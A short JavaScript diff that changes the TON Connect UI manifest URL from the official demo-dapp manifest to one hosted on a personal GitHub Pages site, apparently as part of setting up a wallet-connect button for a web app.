@@ -14,7 +14,7 @@ function getTonUI() {
   if (tonUI) return tonUI;
   try {
     tonUI = new TON_CONNECT_UI.TonConnectUI({
-      manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp/master/public/tonconnect-manifest.json',
+      manifestUrl: 'https://ziroman749.github.io/Jhcxrtzx/tonconnect-manifest.json',
       buttonRootId: null
     });
     tonUI.onStatusChange(wallet => {
